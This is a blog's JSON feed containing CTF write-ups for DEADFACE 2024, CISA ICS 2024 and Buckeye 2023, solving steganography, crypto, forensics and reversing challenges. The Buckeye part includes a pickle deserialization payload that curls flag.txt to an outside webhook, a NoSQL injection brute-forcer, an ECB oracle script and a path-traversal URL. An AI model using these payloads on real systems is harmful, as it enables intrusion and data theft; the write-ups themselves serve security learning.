{
  "version": "https://jsonfeed.org/version/1",
  "title": "Cramik",
  "home_page_url": "https://cramik.de",
  "feed_url": "https://cramik.de/feed/feed.json",
  "description": "",
  "author": {
    "name": "Cramik",
    "url": ""
  },
  "items": [{
      "id": "https://cramik.de/posts/deadface-ctf-2024/",
      "url": "https://cramik.de/posts/deadface-ctf-2024/",
      "title": "DEADFACE CTF 2024",
      "content_html": "<p>It took me like 15 minutes to figure out what CTF these notes were for because I never labelled them and half of these challenges don't show up when you google them.</p>\n<h2 id=\"something-in-the-dark\">Something in the Dark <a class=\"direct-link\" href=\"#something-in-the-dark\">#</a></h2>\n<p>Category: Steg<br>\nThe challenge links an image of a tweet talking about flashing &quot;RED GREEN BLUE&quot; and another image. First instinct is using a tool like stegsolver to view the various planes (alpha, red, green, blue) both visually and as data. Going through each plan visually we can spot text on Red Plane 1 saying &quot;flag{ar3_we_410N3??}&quot;</p>\n<h2 id=\"price-check\">Price Check <a class=\"direct-link\" href=\"#price-check\">#</a></h2>\n<p>Category: Steg<br>\nThe challenge gives us a csv with a hint to &quot;scan.&quot; Looking at the csv it is a 29x29 matrix of numbers from 0-255 (denoting a byte, and potentially a color if you get what I'm going with). These two things sound a lot like 29x29 node QR code. I don't believe there is any software to translate this file format and I don't have pillow memorized, so I decided to have chatgpt do it</p>\n<pre><code>See the following:\n# CSV to Image Conversion\n\n#### You:\nI have a csv file denoting a 29x29 black and white image ie 255,255,0,255\\n0,255... can you write a python script to convert it to an image\n\n#### ChatGPT:\nSure! Below is a Python script that reads a CSV file representing a 29x29 black and white image and converts it into an image using the `Pillow` library. The assumption is that values in the CSV represent pixel intensities (0 for black, 255 for white):\n\n\\```python\nimport csv\nfrom PIL import Image\nimport numpy as np\n\n# Load the CSV file\ncsv_file = 'your_file.csv'  # Replace with your CSV file path\noutput_image = 'output_image.png'  # Replace with desired output image name\n\n# Read the CSV file\nwith open(csv_file, newline='') as f:\n    reader = csv.reader(f)\n    data = list(reader)\n\n# Convert the CSV data to a numpy array\nimage_data = np.array(data, dtype=np.uint8)\n\n# Reshape into a 29x29 array\nimage_data = image_data.reshape((29, 29))\n\n# Create an image from the numpy array\nimage = Image.fromarray(image_data)\n\n# Save the image\nimage.save(output_image)\nimage.show()\n\\```\n\n### Key Points:\n\n- The script reads the CSV, converts it to a NumPy array, and reshapes it into a 29x29 grid.\n- It assumes that the values are already in the form of pixel intensities (0 for black and 255 for white).\n- You can replace the CSV file path with your actual file's name.\n\nLet me know if you need any further customization!\n\n\nThis almost works perfectly, but needed to flip it in an image editor because the reshape was kind of weird. In the end we get &quot;flag{that_will_be_five_dollars}&quot;\n</code></pre>\n<h2 id=\"syncopated-beat\">Syncopated Beat <a class=\"direct-link\" href=\"#syncopated-beat\">#</a></h2>\n<p>Category: Steg</p>\n<p>Challenge lists something about demon voices and includes a video, listen to video and you will hear reversed speech partway in the song, classic. Reversing audio in audacity gives us the voices (very good quality audio too)</p>\n<p>The silly &quot;demon&quot; gives a hint that the flag is a band that did a song like &quot;fly like an eagle, time keeps on slipping&quot; in the 70s with all cap, spaces between the words (good song). The band is STEVE MILLER BAND</p>\n<h2 id=\"logical-left-and-rational-right\">Logical Left and Rational Right <a class=\"direct-link\" href=\"#logical-left-and-rational-right\">#</a></h2>\n<p>Challenge is a file with a bunch of \\ and /. Very binary looking</p>\n<p>Used cyberchef</p>\n<pre><code>Find_/_Replace({'option':'Regex','string':'\\\\\\\\'},'0',true,false,true,false)\nFind_/_Replace({'option':'Regex','string':'\\\\/'},'1',true,false,true,false)\nFrom_Binary('Space',8)\n</code></pre>\n<p>Gives us &quot;Just a little something to get started, hope you have fun this year Turbo Tacky!!!! flag{H3YY0UrF1N411Y4W4K3}&quot;</p>\n<h2 id=\"ides-le-talk\">Ides-le Talk <a class=\"direct-link\" href=\"#ides-le-talk\">#</a></h2>\n<p>Challenge is a txt file with text like &quot;Gur Yvsr naq Qrngu bs Whyvhf Pnrfne.&quot; The patterns look a lot like a monoalphabetic substitution cipher, particularly a rotation so tested it versus rot13 in cyberchef and we get &quot;The Life and Death of Julius Caesar.' Ctrl-F for &quot;flag&quot; and we find &quot;flag: L3t_The#Mi$chiefs^8361n&quot;</p>\n<h2 id=\"social-pressure\">Social Pressure <a class=\"direct-link\" href=\"#social-pressure\">#</a></h2>\n<p>Similar challenge to Ides-le but this time ROT13 Bruteforcing didnt work example text: &quot;Svb ororgs, yrt mvdh! Dv'iv tlrmt zugvi Wv Nlmmv Urmzmxrzo mvcg. Gsvri hvxfirgb nvzhfivh szev hlnv slovh gszg dv'iv tlmmz vckolrg yrt grnv! R'ev yvvm klprmt zilfmw zmw ulfmw hlnv HJO efomvizyrorgrvh dv xzm oveviztv uli nzcrnfn xszlh.&quot;</p>\n<p>Since ROT13 didn't work I shoved it in dcode's monoalphabetic substitution cipher solver (<a href=\"https://www.dcode.fr/monoalphabetic-substitution\">https://www.dcode.fr/monoalphabetic-substitution</a>). This gives us &quot;HEY LILITH, BIG NEWS! WE'RE GOING AFTER DE MONNE FINANCIAL NEXT. THEIR SECURITY MEASURES HAVE SOME HOLES THAT WE'RE GONNA EXPLOIT BIG TIME! I'VE BEEN POKING AROUND AND FOUND SOME SQL VULNERABILITIES WE CAN LEVERAGE FOR MAXIMUM CHAOS.&quot; and two potential keys (ZYXWVUTSRAPONMLKJIHGFEDCBQ or JYXWVUTSRQPONMLKZIHGFEDCBA). Using these we can decrypt their chats and find that they are talking about &quot;Elroy Ongaro&quot; so the flag is &quot;flag{Elroy_Ongaro}</p>\n<h2 id=\"cereal-killer-01\">Cereal Killer 01 <a class=\"direct-link\" href=\"#cereal-killer-01\">#</a></h2>\n<p>Using IDA to decompile the windows code we get something like</p>\n<pre><code>  sub_791020(&quot;As in, which spooky cereal is best?\\n&quot;, v27);\n  sub_791020(&quot;Mr. Robert F. Kennedy, Jr. has a favorite spooky cereal.  Tear apart this\\n&quot;, v28);\n  sub_791020(&quot;binary and see if you can figure out what it is!\\n&quot;, v29);\n  sub_791020(&quot;\\n\\n&quot;, v30);\n  sub_791020(&quot;Please enter the password: &quot;, v31);\n  sub_791060(&quot;%1023[^\\n]&quot;, (char)Src);\n  v8 = Src;\n  for ( j = strlen(Src); isspace(ArgList[j + 47]); Src[j] = 0 )\n    --j;\n  for ( k = Src[0]; k; --j )\n  {\n    if ( !isspace(k) )\n      break;\n    k = *++v8;\n  }\n  memmove(Src, v8, j + 1);\n  sub_7910A0(13);\n  if ( !strncmp(Str1, &quot;obboreel&quot;, 8u) )\n  {\n    v24 = &quot;ACCESS DENIED!!!\\n&quot;;\n  }\n</code></pre>\n<p>so I tried &quot;obboreel&quot; as the password. That didn't work, so I did it again and looked to see what it was comparing for the strncmp. In this stack we could see &quot;booberry&quot; so I used that and it worked and spat out the flag</p>\n<h2 id=\"she's-got-issues\">She's Got Issues <a class=\"direct-link\" href=\"#she's-got-issues\">#</a></h2>\n<p>&quot;Head over to their code repo and see if you can gather some intel on the state of the develop team and other clues that might help you hack the Sweepstakes website.&quot;<br>\nClick repo, check issues tab, ctrl-f &quot;flag&quot;, flag{CK06b-What-The-Director-Wants-The-Director-Gets!!!}</p>\n<h2 id=\"image-of-the-beast\">Image of the Beast <a class=\"direct-link\" href=\"#image-of-the-beast\">#</a></h2>\n<p>Some sorta lore about a disgruntled employee, he left something for us in a repo. Link to a github. Click link to github, find image by the disgruntled employee, look at exif data &quot;WebStatement\t<a href=\"https://schnickschnock.lyttonlabs.org/schnickschnock/welp.html\">https://schnickschnock.lyttonlabs.org/schnickschnock/welp.html</a>&quot; Flag at the bottom of page &quot;flag{CK06a-Clippy-Isnt-Disgruntled-He-Was-Never-Gruntled-In-The-First-Place!!!}&quot;</p>\n<h2 id=\"cereal-killer-05\">Cereal Killer 05 <a class=\"direct-link\" href=\"#cereal-killer-05\">#</a></h2>\n<p>Use a java decompiler to decompile the code, notice it uses an incrementing xor cipher to decrypt the url with our supplied cipher and that the plaintext url starts with &quot;https://'. Use the reversibility of xor with known plaintext as such:</p>\n<pre><code>encrypted_url=[42, 6, 68, 64, 7, 120, 93, 31, 83, 17, 48, 23, 81, 92, 90, 46, 11, 68, 68, 27, 44, 30, 81, 82, 7, 108, 29, 66, 87, 91, 33, 23, 66, 85, 21, 46, 1, 31, 86, 6, 45, 29, 68, 82, 6, 45, 29, 68, 30, 30, 50, 23, 87]\nfor i in range(len(&quot;https://&quot;)): print(chr(encrypted_url[i]^ord(&quot;https://&quot;[i])),end='')\n</code></pre>\n<p>This gives us &quot;Br00tBr0'<br>\nbut we happen to know there is a modulus in the code so the key is reused, so we can assume the key is actually just &quot;Br00t&quot;</p>\n<pre><code>C:\\Users\\Cramik\\Desktop&gt;java -jar cerealkiller05.jar\nPresident Donald Trump has a favorite cereal.  It is great... really great...\nThe reason it is so great, is because HE likes it... that makes it reall great...\nOf course, to maintain utmost secrecy, it is protected with a password that is\nHIGHLY secure (and backed up securely on a piece of paper somewhere in Mar Lago...)\nNow, you, being a highly trained hacker, should be able to BYPASS this security and\ndiscover what President Trump's favorite monster cereal is.\n\nEnter password: Br00t\nDecrypted URL: https://cereal.lyttonlabs.org/cereals/frootbroot.jpeg\nDecrypted Flag: flag{Fr00t-Br00t-is-the-only-cereal-for-Prez-Trump!}\n</code></pre>\n<h2 id=\"cereal-killer-02\">Cereal Killer 02 <a class=\"direct-link\" href=\"#cereal-killer-02\">#</a></h2>\n<p>I played around with inputs and noticed that the access denied output is hit when a DWORD (labelled v9 by IDA) fails an if comparison with another DWORD (v11). I also noticed that v11 is independent of our input so its likely the intended result of our input. With this, I patched the assembly above that sets<br>\n&quot;v9 = &amp;v44;&quot; to the equivalent of &quot;v9 = &amp;v45;&quot; since v11 is set to &amp;v45 right before the comparison<br>\nbasically turned</p>\n<pre><code>.text:00FE1435 lea     ecx, [esp+760h+var_480]\n.text:00FE143C mov     esi, 0Ch\n.text:00FE1441 lea     edx, [esp+760h+var_470]\n</code></pre>\n<p>to</p>\n<pre><code>.text:00FE1435 lea     ecx, [esp+760h+var_470]\n.text:00FE143C mov     esi, 0Ch\n.text:00FE1441 lea     edx, [esp+760h+var_470]\n</code></pre>\n<h2 id=\"data-breach\">Data Breach <a class=\"direct-link\" href=\"#data-breach\">#</a></h2>\n<p>Downloaded the pcap file, pcapng so couldn't use networkminer free version :(. Sorted by protocol, skipped ARP, thought DNS looked suspicious but didnt see anything easy to solve, so went down to HTTP. Noticed an HTTP header &quot;Not-Suppose-To-Be-Here: flag{Information_disclosure_in_the_head}&quot;</p>\n<h4 id=\"(future-me-here.-you-can-just-use-wireshark-to-convert-pcapng-to-pcap)\">(Future me here. You can just use wireshark to convert pcapng to pcap) <a class=\"direct-link\" href=\"#(future-me-here.-you-can-just-use-wireshark-to-convert-pcapng-to-pcap)\">#</a></h4>\n<h2 id=\"winning-factors\">Winning Factors <a class=\"direct-link\" href=\"#winning-factors\">#</a></h2>\n<pre><code>from pwn import *\nfrom math import factorial\na=remote(&quot;147.182.245.126&quot;,&quot;33001&quot;);b=a.recvline();print(b);number=b[27:-2];print(number);answer=str(math.factorial(int(number)));print(answer);a.send(answer);b=a.recvall(timeout=1);print(b)\n</code></pre>\n<h2 id=\"is-this-vul-ner-ble%3F\">Is This Vul-ner-ble? <a class=\"direct-link\" href=\"#is-this-vul-ner-ble%3F\">#</a></h2>\n<pre><code>hashcat -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsIm5vbmNlIjoiIn0.eyJpc3MiOiJ0dXJib3RhY3RpY2FsLm5ldCIsImV4cCI6IjE0NTA2NTkxMDIiLCJ1cG4iOiJjZm9kZXJhIiwiZnVsbF9uYW1lIjoiQ2xhaXIgRm9kZXJhIiwidXNlcm5hbWUiOiJDRm9kZXJhOTEiLCJwaG9uZV9udW1iZXIiOiIiLCJqdGkiOiJmdGlkMjM0MmEtMzI0M2QtMjM0My1kMzR5OHlnZmZlIiwic3R1ZmYiOjExMjIyLCJncm91cHMiOlsibG93X2FkbWluIiwicmVtb3RlX3VzZXIiLCJsYWJ0ZWNoIl0sIm9yZyI6IlR1cmJvVGFjdGljYWwiLCJzdWJfb3JnIjoiR3JvdXBfRCIsIm5idCI6NTc1NDczNzU0ODI5NTI3NTAwMDAsImxkZV9zIjpbeyJhc3RhdHVzIjoibnVsbCIsImJzdGF0dXMiOiJudWxsIiwiY3N0YXR1cyI6InZhbGlkIiwiZHN0YXR1cyI6Im51bGwifV19.kQKRFPLj_SqVeEiBjfKi7FKOEVoV71JgdFRxDTjp7TQ fasttrack.txt\n</code></pre>\n",
      "date_published": "2024-10-18T00:00:00+00:00"
    },{
      "id": "https://cramik.de/posts/cisa-ics-2024/",
      "url": "https://cramik.de/posts/cisa-ics-2024/",
      "title": "CISA ICS CTF 2024",
      "content_html": "<h2 id=\"extend-your-stay---1\">Extend Your Stay - 1 <a class=\"direct-link\" href=\"#extend-your-stay---1\">#</a></h2>\n<p>crx files are chrome extensions that are basically just zip files. We can open it up, go to background.js and we'll see some code at the bottom:</p>\n<pre><code>// This will execute when the extension is first installed\nchrome.runtime.onInstalled.addListener(() =&gt; {\n    var val = &quot;ZmxhZ3toeXAzcjN4dDNuZDNkfQ==&quot;;\n    console.log(&quot;NO MORE RODENTS!!!!!!!!!!&quot;);\n    console.log(atob(val));\n});\n</code></pre>\n<p>val is a base64 encoded string that decodes to &quot;flag{hyp3r3xt3nd3d}&quot;</p>\n<h2 id=\"extend-your-stay---2\">Extend Your Stay - 2 <a class=\"direct-link\" href=\"#extend-your-stay---2\">#</a></h2>\n<p>This part is included in the obfuscated part since it is malicious, we dont actually have to deobfuscate we can just start base64 decoding random base64 strings until we find  aHR0cHM6Ly93d3cuZmVsbHN3YXJnby5jb20v == <a href=\"https://www.fellswargo.com/\">https://www.fellswargo.com/</a> which matches the challenge prompt</p>\n<h2 id=\"mission%3A-inconceivable---1\">Mission: Inconceivable - 1 <a class=\"direct-link\" href=\"#mission%3A-inconceivable---1\">#</a></h2>\n<p><a href=\"https://postalpro.usps.com/ppro-tools/encoder-decoder\">https://postalpro.usps.com/ppro-tools/encoder-decoder</a><br>\nDAFFFDDFTTFATDTDFFDTDAFADAATFATDTADTAFFDDTDTTADFDTTFDDAFAFFAFTATT<br>\nChicago</p>\n<h2 id=\"mission%3A-inconceivable---2\">Mission: Inconceivable - 2 <a class=\"direct-link\" href=\"#mission%3A-inconceivable---2\">#</a></h2>\n<p>&quot;Using the information you know about the attackers, especially their culinary tastes, can you identify the BSSID (the access point's MAC address) for their hideout's WiFi network?&quot;<br>\n8A:9C:67:46:08:B1<br>\n41.67711639,-107.9834137,Bringmetacosplease,0,20230701-00000,2023-07-01T14:00:00.000Z,2023-08-26T05:00:00.000Z,2023-08-26T05:00:00.000Z,8A:9C:67:46:08:B1,,infra,,2,0,?,?,?,False,11,,wpa2,US,WY,Carlton Road,,,</p>\n<h2 id=\"read-askew-manuscripts---1\">Read Askew Manuscripts - 1 <a class=\"direct-link\" href=\"#read-askew-manuscripts---1\">#</a></h2>\n<p>volatility.exe printkey -f memdump_fewer_images_test1.raw -K Software\\ACME_XRay<br>\nZmxhZ3tmMzNsMW5nX3YwbEB0MWwzfQ==<br>\nflag{f33l1ng_v0l@t1l3}</p>\n<h2 id=\"read-askew-manuscripts---2\">Read Askew Manuscripts - 2 <a class=\"direct-link\" href=\"#read-askew-manuscripts---2\">#</a></h2>\n<p>C:\\Users\\Cramik\\Downloads\\memdump.raw&gt;volatility.exe notepad -f memdump_fewer_images_test1.raw<br>\nVolatility Foundation Volatility Framework 2.6<br>\nProcess: 172<br>\nText:<br>\nDear friend,</p>\n<p>Thank you for supporting this mission. Well, not like you really had a choice :)</p>\n<p>Upload the patient's image using the link below. Do not upload any other patients. And do not get the wrong patient. I am out of patience.</p>\n<p><a href=\"https://www.ev1lf1lestorage.info/?directory=images&amp;user=ominousnoteperson&amp;passB64=aWxpa2V3cml0aW5nb21pbm91c25vdGVz&amp;login=true\">https://www.ev1lf1lestorage.info/?directory=images&amp;user=ominousnoteperson&amp;passB64=aWxpa2V3cml0aW5nb21pbm91c25vdGVz&amp;login=true</a></p>\n<p>If necessary, you can use this flash drive to extract the image, but ONLY if the cloud storage doesn't work. And I know it works so don't pull any funny business.</p>\n<p>Drop this flash drive at ///trips.pistons.huffs when you're done. If you see a man with an accordion, run.</p>\n<p>See you never,</p>\n<p>The Ominous Note Writer</p>\n<p>P.S. If you get hungry on this mission, you're on your own. Bring a snack and just Eat It.</p>\n<p>ilikewritingominousnotes</p>\n<h2 id=\"read-askew-manuscripts---3\">Read Askew Manuscripts - 3 <a class=\"direct-link\" href=\"#read-askew-manuscripts---3\">#</a></h2>\n<p>C:\\Users\\Cramik\\Downloads\\memdump.raw&gt;volatility.exe iehistory -f memdump_fewer_images_test1.raw<br>\nVolatility Foundation Volatility Framework 2.6</p>\n<hr>\n<p>Process: 1588 explorer.exe<br>\nCache type &quot;DEST&quot; at 0x21b1e2d<br>\nLast modified: 2024-04-11 11:42:52 UTC+0000<br>\nLast accessed: 2024-04-11 17:42:54 UTC+0000<br>\nURL: Administrator@file:///E:/Phoenix_Wright.png</p>\n<hr>\n<p>Process: 1588 explorer.exe<br>\nCache type &quot;DEST&quot; at 0x21cea1d<br>\nLast modified: 2024-04-11 11:42:52 UTC+0000<br>\nLast accessed: 2024-04-11 17:42:54 UTC+0000<br>\nURL: Administrator@file:///E:/Phoenix_Wright.png</p>\n<h2 id=\"read-askew-manuscripts---4\">Read Askew Manuscripts - 4 <a class=\"direct-link\" href=\"#read-askew-manuscripts---4\">#</a></h2>\n<p><a href=\"https://steemit.com/security/@nybble/forensic-extracting-files-from-mft-table-with-volatility-part-2-en\">https://steemit.com/security/@nybble/forensic-extracting-files-from-mft-table-with-volatility-part-2-en</a></p>\n<p>C:\\Users\\Cramik\\Downloads\\memdump.raw&gt;volatility.exe filescan -f memdump_fewer_images_test1.raw | grep Phoenix<br>\nVolatility Foundation Volatility Framework 2.6<br>\n0x00000000096959b0      1      0 RW-rw- \\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\Recent\\Phoenix_Wright.lnk<br>\n0x0000000009769228      1      0 R--r-- \\Device\\DP(1)0-0+3\\Phoenix_Wright.png<br>\n0x000000000978c820      1      0 R--r-- \\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\Desktop\\patient_images\\Phoenix_Wright.png</p>\n<p>C:\\Users\\Cramik\\Downloads\\memdump.raw&gt;volatility.exe dumpfiles -Q 0x0000000009769228 -D files/ -u -n -f memdump_fewer_images_test1.raw<br>\nVolatility Foundation Volatility Framework 2.6<br>\nDataSectionObject 0x09769228   None   \\Device\\DP(1)0-0+3\\Phoenix_Wright.png</p>\n<h2 id=\"follow-the-charts---3\">Follow the Charts - 3 <a class=\"direct-link\" href=\"#follow-the-charts---3\">#</a></h2>\n<p>The malicious application is a notes to bash converter. The main function for decoding is &quot;decodechart.&quot; Reversing is an option, but would be hard considering the amount of xors, bitwise operations, and subfuctions. Instead, we can use a sandbox like app.any.run just to see what commands it runs and we'll see &quot;sh -c &quot;#flag{W31C0Me_t0_tH3_JUn6L3} echo &quot;Finished updating clone hero charts :)&quot;&quot;&quot;</p>\n<h2 id=\"introduction-to-malcolm---8\">Introduction to Malcolm - 8 <a class=\"direct-link\" href=\"#introduction-to-malcolm---8\">#</a></h2>\n<p>destination.port&gt;60000 AND source.port&gt;60000<br>\ninclude the network.community_id field on the left side</p>\n<h2 id=\"introduction-to-malcolm---9\">Introduction to Malcolm - 9 <a class=\"direct-link\" href=\"#introduction-to-malcolm---9\">#</a></h2>\n<p>communityId==&quot;1:lkHwtdagxh1Nv9QKO2SuVdVkQ0I=&quot;</p>\n<h2 id=\"learning-to-drift---1\">Learning to DRIFT - 1 <a class=\"direct-link\" href=\"#learning-to-drift---1\">#</a></h2>\n<p>packet 6 PLC -&gt; HMI NEW-CONNECTION-RESPONSE<br>\n000c = length<br>\n01 = message code (NEW-CONNECTION)<br>\n00 = respone code<br>\n61cb506b8ff1b477 = Partial AES</p>\n<p>The first encrypted command sent by the HMI in this capture is a Read-Sensor command. What was the responded current-value of that sensor (sensor id is 100)?</p>\n<p>packet 8 HMI -&gt; PLC READ-SENSOR-REQUEST<br>\n001a = length<br>\na9de4b26a71f6989 = partial aes key<br>\n6d21595f8c02ffad25b55ed49a4a3d8e</p>\n<p>Create a cyberchef recipe:<br>\nAES_Decrypt({'option':'Hex','string':'61cb506b8ff1b477a9de4b26a71f6989'},{'option':'Hex','string':''},'ECB','Hex','Raw',{'option':'Hex','string':''},{'option':'Hex','string':''})<br>\nTo_Hex('Space',0)</p>\n<p>Decrypt 6d21595f8c02ffad25b55ed49a4a3d8e</p>\n<p>Output:<br>\n03 - Message code (READ-SENSOR)<br>\n64 - Sensor ID</p>\n<p>Packet 9 PLC -&gt; HMI READ-SENSOR-RESPONSE<br>\n001a = length<br>\n9191c45d7fe2ddca = partial aes key<br>\n39f35ca00eb0ada6c29996f1bf9eb2e7</p>\n<p>AES_Decrypt({'option':'Hex','string':'61cb506b8ff1b4779191c45d7fe2ddca'},{'option':'Hex','string':''},'ECB','Hex','Raw',{'option':'Hex','string':''},{'option':'Hex','string':''})<br>\nTo_Hex('Space',0)<br>\nDecrypt 39f35ca00eb0ada6c29996f1bf9eb2e7</p>\n<p>Output:<br>\n03 = message code<br>\n00 = response code<br>\n64 = sensor id<br>\n00 00 02 06 = value<br>\n0206 hex to decimal is 518</p>\n<p>Bulk Recipe:<br>\nDrop_bytes(0,4,false)<br>\nRegister('(^.{16})',true,false,false)<br>\nDrop_bytes(0,16,false)<br>\nAES_Decrypt({'option':'Hex','string':'9bc665880b5df8fc$R0'},{'option':'Hex','string':''},'ECB','Hex','Raw',{'option':'Hex','string':''},{'option':'Hex','string':''})<br>\nTo_Hex('Space',0)</p>\n<p>Sensor request: 001a0a6f538822259c7390a6e5d86712724891d7549593f8ff95<br>\n06 = message code<br>\n06 = count<br>\n64 65 66 67 68 69 = sensor ids</p>\n<p>Sensor Response:<br>\n06 = message code<br>\n00 = response code<br>\n06 = sensor count<br>\nSensor ranges:<br>\n64 00 00 01 e0 00 00 02 3a 00 00 01 c2 00 00 02 58 65 00 00 01 9a 00 00 01 ea 00 00 01 90 00 00 01 f4 66 00 00 00 41 00 00 00 4b 00 00 00 3c 00 00 00 50 67 00 00 00 41 00 00 00 4b 00 00 00 3c 00 00 00 50 68 00 00 00 41 00 00 00 4b 00 00 00 3c 00 00 00 50 69 00 00 00 41 00 00 00 4b 00 00 00 3c 00 00 00 50</p>\n<p>Each sensor range is 17 bytes:<br>\n64000001e00000023a000001c200000258<br>\n650000019a000001ea00000190000001f4<br>\n66000000410000004b0000003c00000050<br>\n67000000410000004b0000003c00000050<br>\n68000000410000004b0000003c00000050<br>\n69000000410000004b0000003c00000050</p>\n<p>Break up each sensor range to ID and ranges<br>\n64 = Sensor ID<br>\n000001e0 = WARNING-LOW<br>\n0000023a = WARNING-HIGH<br>\n000001c2 = ALERT-LOW<br>\n00000258 = ALERT-HIGH</p>\n<p>Alarms (3rd TCP session):<br>\n001a8ddec2027f0172a440e2a3c789beff16e77009c9c5213c1f - GET-ALARM-REQUEST (0x07)</p>\n<p>001a64314cb84d00addee6843f0381d1db25da6b2506dd76f524 - GET-ALARMS-RESPONSE</p>\n<p>Decrypts to:<br>\n07 - Message code<br>\n00 - Response code<br>\n02 - Alarm Count<br>\nAlarm Data:<br>\n66 - Sensor ID<br>\na0 - Alarm Code (WARNING: LOW)<br>\n0000003f - Value = 63</p>\n<p>6b - Sensor ID<br>\nb1 - Alarm Code (ALERT: HIGH)<br>\n0000041a - Value = 1050</p>\n<h2 id=\"a-timely-attack\">A Timely Attack <a class=\"direct-link\" href=\"#a-timely-attack\">#</a></h2>\n<pre><code>import subprocess\nimport string\nimport time\n\n# Base string to start with\ntest_string = [&quot;0&quot;]*8\nbest_char = ''\nkeyspace = string.digits+string.ascii_lowercase\n\nfor i in range(len(test_string)):\n\tmax_time = -1\n\tsecond_best = -1\n\tbest_char = ''\n\t\n\tfor char in keyspace:\n\t\ttest_string[i]=char\n\t\t\n\t\tstart_time = time.time()\n\n\t\tfor _ in range(1): subprocess.run([&quot;./time_attack1&quot;, ''.join(test_string)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n\t\telapsed_time = time.time() - start_time\n\t\tprint(f&quot;{char} - {elapsed_time}&quot;)\n\t\tif elapsed_time &gt; max_time:\n\t\t\tsecond_best = max_time\n\t\t\tmax_time = elapsed_time\n\t\t\tbest_char = char\n\ttest_string[i]=best_char\n\tprint(f&quot;Found {best_char} {(max_time/second_best-1)} Current best string: {''.join(test_string)}, elapsed time: {max_time}&quot;)\n\n# Final string after all iterations\nprint(f&quot;Final string: {test_string}&quot;)\n</code></pre>\n<p>flag{1t_0Nly_T@k3s_4_l3ttlE_T!mE}</p>\n",
      "date_published": "2024-09-01T00:00:00+00:00"
    },{
      "id": "https://cramik.de/posts/buckeye-ctf-2023/",
      "url": "https://cramik.de/posts/buckeye-ctf-2023/",
      "title": "Buckeye CTF 2023",
      "content_html": "<h2 id=\"stray\">Stray <a class=\"direct-link\" href=\"#stray\">#</a></h2>\n<p>I wrote down this was a javascript type pollution LFI</p>\n<p><a href=\"https://stray.chall.pwnoh.io/cat?category%5B%5D=../flag.txt\">https://stray.chall.pwnoh.io/cat?category[]=../flag.txt</a></p>\n<p>bctf{j4v45cr1p7_15_4_6r347_l4n6u463}</p>\n<h2 id=\"electronical\">Electronical <a class=\"direct-link\" href=\"#electronical\">#</a></h2>\n<p>I did this one in three parts since my script was broken but still solved it. Even the official solution for this one said &quot;solve script doesn't entirely work but mostly&quot;</p>\n<h3 id=\"script1\">Script1 <a class=\"direct-link\" href=\"#script1\">#</a></h3>\n<pre><code>import string\nimport requests\n\nzeros=11\npayload=&quot;bctf&quot;\nwhile zeros!=0:\n    goal=requests.get(&quot;https://electronical.chall.pwnoh.io/encrypt?message=&quot;+'0'*zeros).text[:32]\n    print(&quot;Goal = &quot;, goal)\n    for char in string.printable:\n        print('0'*zeros+payload+char)\n        check=requests.get(&quot;https://electronical.chall.pwnoh.io/encrypt?message=&quot;+'0'*zeros+payload+char).text[:32]\n        print(&quot;Check = &quot;, check)\n        if (check==goal):\n            print(&quot;Correct&quot;)\n            payload+=char\n            zeros-=1\n            break\n</code></pre>\n<h3 id=\"script2\">Script2 <a class=\"direct-link\" href=\"#script2\">#</a></h3>\n<pre><code>import string\nimport requests\n\nzeros=16\npayload=&quot;bctf{1_c4n7_b3l&quot;\nwhile zeros!=0:\n    goal=requests.get(&quot;https://electronical.chall.pwnoh.io/encrypt?message=&quot;+'0'*zeros).text[32:64]\n    print(&quot;Goal = &quot;, goal)\n    for char in string.printable:\n        print('0'*zeros+payload+char)\n        check=requests.get(&quot;https://electronical.chall.pwnoh.io/encrypt?message=&quot;+'0'*zeros+payload+char).text[32:64]\n        print(&quot;Check = &quot;, check)\n        if (check==goal):\n            print(&quot;Correct&quot;)\n            payload+=char\n            break\n    zeros-=1\n</code></pre>\n<h3 id=\"script3\">Script3 <a class=\"direct-link\" href=\"#script3\">#</a></h3>\n<pre><code>import string\nimport requests\n\nzeros=16\npayload=&quot;bctf{1_c4n7_b3l13v3_u_f0und_my_&quot;\nwhile zeros!=0:\n    goal=requests.get(&quot;https://electronical.chall.pwnoh.io/encrypt?message=&quot;+'0'*zeros).text[64:96]\n    print(&quot;Goal = &quot;, goal)\n    for char in string.printable:\n        print('0'*zeros+payload+char)\n        check=requests.get(&quot;https://electronical.chall.pwnoh.io/encrypt?message=&quot;+'0'*zeros+payload+char).text[64:96]\n        print(&quot;Check = &quot;, check)\n        if (check==goal):\n            print(&quot;Correct&quot;)\n            payload+=char\n            break\n    zeros-=1\n</code></pre>\n<h2 id=\"area51\">Area51 <a class=\"direct-link\" href=\"#area51\">#</a></h2>\n<p>Abusing NoSQL injection. See <a href=\"https://portswigger.net/web-security/nosql-injection\">https://portswigger.net/web-security/nosql-injection</a></p>\n<pre><code>import requests\nimport string\n\nsuccess=len(requests.get(&quot;https://area51.chall.pwnoh.io/&quot;,cookies={&quot;session&quot;:&quot;{\\&quot;token\\&quot;:{\\&quot;$regex\\&quot;:\\&quot;&quot;+password+&quot;.*\\&quot;}}&quot;}).content)\nkeyspace=string.ascii_letters+string.digits+&quot;_&quot;+&quot;{&quot;+&quot;}&quot;\npassword=&quot;bctf&quot;\nwhile(password[-1]!='}'):\n     for char in keyspace:\n             print(password+char)\n             if(len(requests.get(&quot;https://area51.chall.pwnoh.io/&quot;,cookies={&quot;session&quot;:&quot;{\\&quot;token\\&quot;:{\\&quot;$regex\\&quot;:\\&quot;&quot;+password+char+&quot;.*\\&quot;}}&quot;}).content)==success): \n                 password+=char\n                 break\n</code></pre>\n<h2 id=\"text-adventure-api\">Text Adventure API <a class=\"direct-link\" href=\"#text-adventure-api\">#</a></h2>\n<p>Only slightly different from official solution. Save pickle is loaded on the server allowing RCE via python reduce</p>\n<pre><code>class test:\n  def __reduce__(self):\n             import subprocess\n             return subprocess.check_output, ([&quot;curl&quot;,&quot;-d&quot;,&quot;@flag.txt&quot;,&quot;https://webhook.site/d5092a4a-c837-495e-b231-1511bcdaddae&quot;],)\npickle.dump(test(),open('C:/Users/Cramik/Desktop/payload5.pkl','wb'))\n</code></pre>\n",
      "date_published": "2023-10-02T00:00:00+00:00"
    },{
      "id": "https://cramik.de/posts/csaw-ctf-2023/",
      "url": "https://cramik.de/posts/csaw-ctf-2023/",
      "title": "CSAW CTF 2023",
      "content_html": "",
      "date_published": "2023-09-15T00:00:00+00:00"
    },{
      "id": "https://cramik.de/posts/picoctf-2022-wizardlike-unique/",
